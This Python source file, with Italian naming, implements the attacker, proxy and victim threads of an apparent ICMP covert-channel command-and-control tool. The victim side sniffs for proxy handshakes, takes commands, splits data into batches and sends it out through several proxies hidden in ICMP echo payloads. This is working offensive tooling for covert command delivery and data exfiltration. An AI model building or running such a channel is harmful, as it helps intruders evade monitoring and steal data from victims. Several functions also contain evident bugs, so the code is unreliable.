import ipaddress, threading, socket
from type.check_type import is_threading_Timer, is_AsyncSniffer, is_string, is_ipaddress, is_threading_Lock, is_dictionary, is_boolean, is_callable_function, is_list, is_socket, is_enum_member, is_threading_Event, is_integer
from classes import DATA, CALC
from type.get_type import get_threading_Lock, get_timer, get_threading_Event, get_AsyncSniffer
from custom_enum import ATTACK_TYPE, MSG, ICMP_TYPE, EXIT_CASES, SENDER_TYPE
from victim_attack import HOST_CONNESSI, Victim
from utils_methods import ask_bool_choice, threadEvent_wait, threadEvent_set
from config import DEBUG, use_delay, type_sender, WAITING_TIME, timeout_time
from attack.singleton import SendSingleton, ReceiveSingleton 
from attack.attack_classes import _IPx
from scapy.all import AsyncSniffer, Raw, IP, ICMP
from network.network_methods import default_interface
from network.network_classes import INTERFACE_FROM_IP 

class THREAD_ATTACCANTE:
    class PROXIES_CONECTION: 
        def __init__(self, proxy_list:dict[str,DATA.PROXY]):
            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
                raise ValueError("Lista dei proxy non valida") 
            self.thread_lock=get_threading_Lock() 
            self.thread_list:dict[str:threading.Thread]=dict()
            for proxy in proxy_list.values(): 
                self.thread_list[proxy.ipaddress.compressed]=None  
            self.unusable_proxy:list[DATA.PROXY]=[] 

        def start(self, ip_vittima:ipaddress._IPAddressBase,attack_function:ATTACK_TYPE, proxy_list:dict[str,DATA.PROXY]): 
            def callback(proxy_data:DATA.PROXY=None): 
                try: 
                    set_connessione(proxy_data) 
                    if not is_socket(proxy_data.socket): 
                        raise ValueError(f"Proxy {proxy_data.ipaddress} socket non inizializzato")
                    send_conferma(proxy_data) 
                    print(f"Messaggio di conferma valido per {proxy_data.ipaddress}")
                    wait_risposta(proxy_data) 
                    print(f"Proxy {proxy_data.ipaddress} connesso alla vittima") 
                except Exception as e: 
                    print(f"PROXIES_CONECTION.callback: {e}") 
                    print(f"Connessione con {proxy_data.ipaddress} fallita") 
                    with self.thread_lock: 
                        self.unusable_proxy.append(proxy_data)  
            def set_connessione(proxy:DATA.PROXY=None): 
                socket_proxy=None 
                socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket_proxy.settimeout(15) #15 secondi 
                socket_proxy.connect((proxy.ipaddress.compressed, proxy.port)) 
                with self.thread_lock: 
                    proxy.socket=socket_proxy 
                print(f"Connessione con {proxy.ipaddress} stabilita") 
            def send_conferma(proxy:DATA.PROXY): 
                confirm_msg=( 
                    MSG.CONFIRM_ATTACKER.value+"|"+ 
                    proxy.ipaddress.compressed+"|"+
                    ip_vittima.compressed+"|"+ 
                    MSG.ATTACK_FUNCTION.value+"|"+
                    attack_function.name 
                ) 
                #TODO implementare metodi per riprovare in caso di fallimento
                proxy.socket.settimeout(10) 
                proxy.socket.sendall(confirm_msg.encode()) 
                print(f"Messaggio di conferma inviato a {proxy}") 
                data=""
                while True:
                    proxy.socket.settimeout(10) 
                    chunk=proxy.socket.recv(1024).decode() 
                    if not chunk: break
                    data+=chunk
                    if MSG.END_SOCKETSEND.value in data: 
                        data=data.replace(MSG.END_SOCKETSEND.value,"")
                        break 
                confirm_msg=( 
                    MSG.CONFIRM_PROXY.value+"|"+ 
                    proxy.ipaddress.compressed+"|"+
                    ip_vittima.compressed+"|"+ 
                    MSG.ATTACK_FUNCTION.value+"|"+
                    attack_function.name 
                ) 
                if not data or data!=confirm_msg:  
                    raise ValueError(f"Messaggio di conferma non valido per {proxy}") 
            def wait_risposta(proxy:DATA.PROXY): 
                confirm_text=( 
                    MSG.CONFIRM_VICTIM.value+"|"+ 
                    ip_vittima.compressed+"|"+ 
                    proxy.ipaddress.compressed 
                ) 
                data=""
                while True:
                    proxy.socket.settimeout(10) 
                    chunk=proxy.socket.recv(1024).decode()  
                    if not chunk: break
                    data+=chunk
                    if MSG.END_SOCKETSEND.value in data: 
                        data=data.replace(MSG.END_SOCKETSEND.value,"")
                        break
                result=data.replace(confirm_text,"") 
                #print(f"{proxy} è connesso alla vittima? {type(result)} {result}") 
                if result!="True": 
                    raise ValueError(f"Proxy {proxy} non connesso alla vittima") 
            def pop_proxy_inutilizzati(): 
                for proxy in self.unusable_proxy: 
                    try: 
                        proxy.socket.sendall(MSG.END_COMMUNICATION.value.encode()) 
                        proxy.socket.close() 
                        print(f"Connessione con {proxy.ipaddress} chiusa")
                    except Exception as e: 
                        print("PROXIES_CONECTION.start-> ",e) 
                        print(f"Errore durante la chiusura della connessione con {proxy.ipaddress}") 
                    with self.thread_lock:  
                        if proxy_list.get(proxy.ipaddress.compressed):
                            proxy_list.pop(proxy.ipaddress.compressed)
                            print(f"{proxy.ipaddress} rimosso...") 
                        else: print(f"{proxy.ipaddress} non rimosso...") 
            #----------------------- 
            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
                raise ValueError("Lista dei proxy non valida") 
            if not is_ipaddress(ip_vittima): 
                raise TypeError("IP vittima non valido") 
            if not is_enum_member(attack_function, ATTACK_TYPE): 
                raise TypeError("Metodo attacco non valido") 
            for key in self.thread_list.keys(): 
                with self.thread_lock:
                    self.thread_list[key]=threading.Thread( 
                        #La callback controlla la connesisone fra l'attaccante ed il proxy
                        target=callback 
                        ,args=[proxy_list[key]] 
                    ) 
                    self.thread_list[key].name=f"Thread-Connect-{key}" 
                self.thread_list[key].start() 
            for thread in self.thread_list.values(): 
                thread.join() 
            print("Chiusura della connessione con proxy inutilizzabili")
            pop_proxy_inutilizzati()

    class WAIT_DATA:
        def __init__(self, proxy_list:dict[str,DATA.PROXY]): 
            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
                raise ValueError("Lista dei proxy non valida") 
            self.thread_lock=get_threading_Lock() 
            self.thread_list:dict[str:threading.Thread]=dict() 
            self.thread_response:dict[str:threading.Thread]=dict() 
            for proxy in proxy_list.values(): 
                self.thread_list[proxy.ipaddress.compressed]=None  
                self.thread_response[proxy.ipaddress.compressed]=False  
        
        def start(self, proxy_list:dict[str,DATA.PROXY]): 
            def callback(proxy_data:DATA.PROXY):  
                if not isinstance(proxy_data, DATA.PROXY):
                    print(f"THREAD.WAIT_DATA: proxy {proxy_data} non valido")
                    return 
                data=""
                while True:  
                    chunk=proxy_data.socket.recv(1024) 
                    print(f"Received from {proxy_data.ipaddress}:\t{chunk.decode()}")
                    if not chunk:
                        break
                    data+=chunk.decode() 
                    if MSG.END_SOCKETSEND.value in data: 
                        data=data.replace(MSG.END_SOCKETSEND.value,"")
                        with proxy_data.data_lock: 
                            proxy_data.data_received.append(data) 
                        if MSG.LAST_PACKET.value not in data: 
                            data="" 
                    if MSG.LAST_PACKET.value in data: 
                        data=data.replace(MSG.LAST_PACKET.value,"") 
                        with proxy_data.data_lock: 
                            proxy_data.data_received.append(data)
                        break 
            #-------------------------------
            if not isinstance(proxy_list, DATA.PROXY) or not len(proxy_list.values())>0: 
                raise ValueError("Lista dei proxy non valida") 
            for key in self.thread_list.keys(): 
                with self.thread_lock:
                    self.thread_list[key]=threading.Thread(
                        target=callback, 
                        args=[proxy_list[key]]
                    ) 
                    self.thread_list[key].name=f"Thread-WaitData-{proxy_list[key].ipaddress.compressed}" 
                    self.thread_list[key].start()  
            print("Definiti e avviati i thread che aspettano i dati dai proxy") 




class THREAD_VICTIM: 
    class WAIT_CONNECTIONS: 
        def __init__(self, vittima:Victim=None, num_connessioni:int=0, connected_proxy:HOST_CONNESSI=None):
            if not isinstance(vittima, Victim): 
                raise TypeError("non oggetto Victim->",type(vittima)) 
            self.vittima=vittima 
            if not is_integer(num_connessioni) or num_connessioni<0: 
                raise TypeError("numero non valido->",num_connessioni) 
            self.num_connessioni=num_connessioni
            if not isinstance(connected_proxy, HOST_CONNESSI): 
                raise TypeError("List host connessi non valida:",connected_proxy)
            self.connected_proxy=connected_proxy
            self.stop_flag={"value":False} 
        
        def start(self,ip_host): 
            def callback_timer(): 
                self.connected_proxy.lock.acquire() 
                #is_enough_proxy=len(connected_proxy.proxy_list) >= num_proxy 
                proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                self.connected_proxy.lock.release()
                if proxy_necessari>0: 
                    msg="Numero minimo di connessioni non raggiunto.\nContinuare ad aspettare ulteriormente? (s/n) " 
                    if ask_bool_choice(msg): 
                        print("Continuo ad aspettare...") 
                        self.timer.cancel() 
                        self.timer=get_timer(WAITING_TIME, callback_timer())  
                        self.timer.start() 
                        return
                    else: print("Smetto di aspettare...") 
                else:print("Numero minimo di connessioni raggiunto") 
                #self.stop_flag["value"]=True 
                threadEvent_set(self.event_enough_proxy) 
            def get_sniffer(): 
                interface=default_interface() 
                if interface is None: 
                    raise ValueError("interface is None",interface) 
                print("Monitoring interface->",interface) 
                sniff_args={
                    "filter": get_filter() 
                    ,"prn":get_pkt_callback()
                    #,"store":False 
                    ,"iface":interface
                } 
                return get_AsyncSniffer(sniff_args) 
            def get_filter(): 
                if not is_ipaddress(ip_host): 
                    raise TypeError("ip_host non valido")  
                IPv4_ECHO_REQUEST= ICMP_TYPE.v4_Echo_Request if ip_host.version==4 else ICMP_TYPE.v6_Echo_Request
                IPv4_ECHO_REPLY= ICMP_TYPE.v4_Echo_Reply if ip_host.version==4 else ICMP_TYPE.v6_Echo_Reply
                if ip_host.version==4: 
                    icmp="icmp " 
                elif ip_host.version==6: 
                    icmp="icmp6 " 
                filter= icmp #if not DEBUG else f"({icmp} or tcp)" 
                filter+=f" and ({icmp}[0]=={IPv4_ECHO_REQUEST} or {icmp}[0]=={IPv4_ECHO_REPLY}) "  
                filter+=f" and dst {ip_host.compressed}"
                return filter 
            def get_pkt_callback(): 
                def pkt_callback(packet): 
                    #print(packet.summary()) 
                    if not packet.haslayer(IP) or not packet.haslayer(ICMP) or not packet.haslayer(Raw): 
                        print("Livello IP, ICMP o Raw non presente nel pacchetto") 
                        return 
                    #else: print("Pacchetto accettato")
                    try:
                        ip_src=ipaddress.ip_address(packet[IP].src) 
                    except Exception as e: 
                        return 
                    self.connected_proxy.lock.acquire() 
                    is_already_connected= ip_src in self.connected_proxy.proxy_list
                    self.connected_proxy.lock.release()  
                    if is_already_connected:  
                        print(f"Host {ip_src} gia connesso...:")
                        return  
                    else: print(f"Host {ip_src} non connesso") 
                    confirm_text=MSG.CONFIRM_PROXY.value+ip_host.compressed 
                    if confirm_text not in packet[Raw].load.decode(): 
                        print("Connessione non confermata")
                        return 
                    str_attacco=packet[Raw].load.decode().replace(confirm_text,"")  
                    attack_function=ATTACK_TYPE.get_attack_method(str_attacco) 
                    print("Tipologia di attacco ricevuto:",attack_function) 
                    if not is_enum_member(attack_function,ATTACK_TYPE): 
                        print("Attacco non valido:",attack_function) 
                        return
                    self.connected_proxy.lock.acquire() 
                    self.connected_proxy.type_attack[ip_src.compressed]=attack_function 
                    self.connected_proxy.lock.release() 
                    print("Tipologia di attacco ricevuto:",self.connected_proxy.type_attack[ip_src.compressed]) 
                    msg_conferma=( 
                        MSG.CONFIRM_VICTIM.value+
                        ip_host.compressed+
                        ip_src.compressed+ 
                        self.connected_proxy.type_attack[ip_src.compressed].name
                    )  
                    try:  
                        SendSingleton(
                            ATTACK_TYPE.ipv4_echo_payload, 
                            SENDER_TYPE.SENDER_TRUE_SENDER, 
                            use_delay=False
                        ).send_data(msg_conferma.encode(), ip_src) 
                        print("Conferma inviata a:",ip_src)  
                        self.connected_proxy.lock.acquire() 
                        if ip_src not in self.connected_proxy.proxy_list:
                            self.connected_proxy.proxy_list.append(ip_src) 
                            print("Proxy aggiunto alla lista")
                        else: print("Proxy già presente") 
                        proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                        self.connected_proxy.lock.release() 
                        if proxy_necessari<=0: # and ask_bool_choice(msg)
                            threadEvent_set(self.event_enough_proxy) 
                            self.stop_flag["value"]=True 
                    except Exception as e: 
                        print(e) 
                        print(f"Connessione non confermata. {ip_src} non aggiunto alla lista") 
                return pkt_callback 
            #-------------------------------------------
            if not is_list(self.connected_proxy.proxy_list): 
                raise TypeError("proxy_list non valido") 
            if not is_threading_Lock(self.connected_proxy.lock): 
                raise TypeError("ip_host non valido")  
            if not is_ipaddress(ip_host): 
                raise TypeError("ip_host non valido") 
            self.event_enough_proxy=get_threading_Event() 
            if not is_threading_Event(self.event_enough_proxy): 
                raise TypeError("non threading.Event",type(self.event_enough_proxy)) 
            self.timer:threading.Timer=get_timer(
                WAITING_TIME, 
                lambda:callback_timer()
            ) 
            if not is_threading_Timer(self.timer): 
                raise TypeError("non è threading.Timer",type(self.timer)) 
            sniffer:AsyncSniffer=get_sniffer()
            if not is_AsyncSniffer(sniffer): 
                raise TypeError("non AsyncSniffer",type(sniffer)) 
            self.timer.start() 
            if self.timer.is_alive():
                print("Timer started...") 
            else: raise RuntimeError("Timer not started...") 
            sniffer.start() 
            if sniffer.running:
                print("Sniffer started...") 
            else: raise RuntimeError("Sniffer not started...") 
            print("Waiting thread to end...") 
            threadEvent_wait(self.event_enough_proxy) 
            if self.timer.is_alive(): 
                self.timer.cancel()
                print("Timer stopped...") 
            sniffer.stop()
            if sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED:",sniffer.running)
            print("Sniffer stopped...") 

    class WAIT_COMMAND: 
        def __init__(self, attack_function, ip_host):
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non ATTACK_TYPE") 
            self.attack_function=attack_function
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido")  
            self.ip_host=ip_host

        def start(self):  
            print("Waiting command tramite:",self.attack_function) 
            wait_class=ReceiveSingleton(self.attack_function).wait_class
            if not isinstance(wait_class, _IPx):  
                raise TypeError("wait_class non valida") 
            if DEBUG: 
                msg="Inserisci il comando: " 
                comando=input(msg) 
            else: 
                wait_class.wait() 
                print("Received data") 
                comando=wait_class.data 
            if not is_string(comando): 
                raise TypeError("comando non stringa",type(comando))  
            print("Command received:",comando) 
            if any(case in comando for case in [e.value for e in EXIT_CASES]): 
                raise ValueError("Comando per interruzione del programma") 
            self.comando=comando

    class SEND_DATA: 
        def __init__(self, vittima:Victim=None, data:str=None):
            def divide_proxy_data(): 
            #def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
                proxy_data=[
                    [] for proxy in vittima.connected_proxy.proxy_list 
                ] 
                #if DEBUG: 
                #    print("DEBUG: send_data -> proxy_data")
                #    proxy_data=[[],[],[],[],[]] 
                #print("PROXY DATA:",proxy_data)
                batch_size=int(1024/(2*2)) #256 bytes 
                batch_number=int(len(data)/batch_size)+1
                for index in range(batch_number): 
                    print("INDEX",index) 
                    start=index*batch_size
                    end=index*batch_size+batch_size 
                    proxy_data[index%len(proxy_data)].append(str(index)+MSG.SEPARATORE_INDEX_DATA.value+data[start:end])  
                #print("WWWW")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch))
                #    for batch in proxy_batch: 
                #        print(batch,end="\t") 
                #    print("\n")
                #print("WWWW") 
                for proxy_index in range(len(proxy_data)): 
                    proxy_batch=proxy_data[proxy_index]
                    if len(proxy_batch)<=0: 
                        continue 
                    new_data="".join(
                        proxy_batch[index] if index==0 
                        else MSG.SEPARATORE_BATCH.value+proxy_batch[index] 
                        for index in range(len(proxy_batch))
                    ) 
                    print("NEW DATA",len(new_data),new_data)
                    proxy_data[proxy_index]=new_data 
                #print("SSSS")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch),proxy_batch) 
                #print("SSSS") 
                return proxy_data
            def send_data(data:str=None, proxy:ipaddress=None, attack_function:ATTACK_TYPE=None): 
                if not is_string(data) or not is_ipaddress(proxy) or not is_enum_member(attack_function, ATTACK_TYPE): 
                    raise TypeError("IP host, Dato oppure Attack non validi") 
                if  data.strip()=="":  
                    send_last_packet(proxy) 
                    return 
                print("DATA",data)
                print("PROXY",proxy) 
                print("ATTACK",attack_function)  
                SendSingleton(
                    attack_function, 
                    type_sender, 
                    use_delay 
                ).send_data(data.encode(), proxy) 
                send_last_packet(proxy) 
                #unavailable_proxy=send_last_packet() 
            def send_last_packet(proxy:ipaddress=None): 
                if not is_ipaddress(proxy): 
                    raise TypeError("IP host non valido")  
                print("SEND LAST PACKET:",proxy) 
                try: 
                    data=MSG.LAST_PACKET.value  
                    SendSingleton(
                        self.attack_function, 
                        type_sender, 
                        use_delay 
                    ).send_data(data.encode(), proxy) 
                except Exception as e: 
                    print(e)
                    print("LAST PACKET NON ARRIVATO:",proxy)   
            #--------------------------- 
            if not is_string(data): 
                raise ValueError("Dati non stringa",data) 
            if not isinstance(vittima, Victim): 
                raise TypeError("Vittima non valida")
            proxy_data=divide_proxy_data(data) 
            if not is_list(proxy_data): 
                raise TypeError("proxy_data non lista") 
            if all(not is_string(stringa) for stringa in proxy_data): 
                raise TypeError("data non string",type(proxy_data)) 
            print("PROXY DATA",proxy_data) 
            print("LEN PROXY DATA",len(proxy_data))
            print("Sending data...") 
            for index in range(len(proxy_data)):
                if DEBUG: 
                    send_data(proxy_data[index], vittima.ip_host, ATTACK_TYPE.ipv4_destination_unreachable)  
                else: 
                    send_data(proxy_data[index], vittima.connected_proxy.proxy_list[index], vittima.connected_proxy.type_attack[index]) 

class THREAD_PROXY: 
    class VICTIM_CONNECTION: 
        def __init__(self): 
            self.lock:threading.Lock=get_threading_Lock()  
            self.stop_flag={"value":False} 
            self.response:bool=False  
            self.event_pktconn:threading.Event=get_threading_Event() 
        
        def start(self, ip_vittima:ipaddress.IPv4Address=None, ip_host:ipaddress.IPv4Address=None): 
            def timeout_timer(): 
                with self.lock:
                    self.response=False 
                    self.stop_flag["value"]=True 
                threadEvent_set(self.event_pktconn) 
            def get_filter(): 
                #checksum=CALC.checksum(confirm_text.strip().encode()) 
                IPv4_ECHO_REQ=8 
                IPv4_ECHO_REP=0 
                if ip_vittima.version==4: 
                    icmp="icmp " 
                elif ip_vittima.version==6: 
                    icmp="icmp6 "  
                if DEBUG: 
                    filter=f"({icmp} or tcp) "
                    #filter+=f" and src {oggetto.ip_vittima.compressed} "
                    filter+=f" and dst {ip_host.compressed}"
                    print("FILTER",filter)
                    return filter
                else: 
                    filter=icmp 
                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQ} or icmp[0]=={IPv4_ECHO_REP}) " 
                    filter+=f" and src {ip_vittima.compressed} "
                    filter+=f" and dst {ip_host.compressed}"
                #filter+=f"and icmp[4:2]={checksum} "
                print("FILTER",filter)
                return filter 
            def callback_connessione(packet):  
                #print(packet.summary()) 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                    if not ip_vittima.compressed==packet[IP].src: 
                        return 
                    confirm_text=(
                        MSG.CONFIRM_VICTIM.value+
                        ip_vittima.compressed+
                        ip_host.compressed
                    )
                    check_sum=CALC.checksum(confirm_text.encode()) 
                    if confirm_text in packet[Raw].load.decode(): 
                        print("CONNESSIONE VITTIMA CONFERMATA")  
                        with self.lock:
                            self.response=True  
                            self.stop_flag["value"]=True 
                        threadEvent_set(self.event_pktconn) 
                        return 
            def stop_filter(pkt): 
                with self.lock:
                    value=self.stop_flag["value"]
                return value
            #-----------------------------------
            if not is_ipaddress(ip_vittima): 
                raise TypeError("Vittima non ha un IP valido")
            if not is_ipaddress(ip_host): 
                raise TypeError("Host non ha un IP valido") 
            self.interface=INTERFACE_FROM_IP(ip_vittima).interface 
            if self.interface is None: 
                raise ValueError("interface is None",self.interface)  
            timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
            sniff_args={
                "filter":get_filter()
                #,"count":1 
                ,"prn":callback_connessione
                #,"store":False 
                #,stop_filter=stop_filter 
                ,"iface":self.interface 
            } 
            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args)  
            sniffer.start()
            if sniffer.running: 
                print("Sniffer started...") 
            else: raise RuntimeError("SNIFFER NOT STARTED") 
            timer.start() 
            if timer.is_alive(): 
                print("Timer started...")  
            threadEvent_wait(self.event_pktconn) 
            if timer.is_alive(): 
                timer.cancel()
                print("Timer stopped...") 
            sniffer.stop()
            if sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED",sniffer.running)
            print("Sniffer stopped...") 



